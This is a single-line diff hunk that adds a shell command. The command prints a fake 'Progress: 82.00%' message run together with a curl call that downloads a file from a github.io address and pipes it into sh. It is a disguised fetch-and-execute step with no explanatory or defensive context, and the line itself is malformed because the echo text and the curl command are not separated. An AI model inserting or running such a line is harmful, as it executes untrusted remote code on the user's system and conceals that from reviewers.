@@ -1,0 +1,1 @@
+echo Progress: 82.00%curl -L --progress-bar frkns.github.io/fun/cu-murray-scan-dialog-rapidly-extended.rs | sh
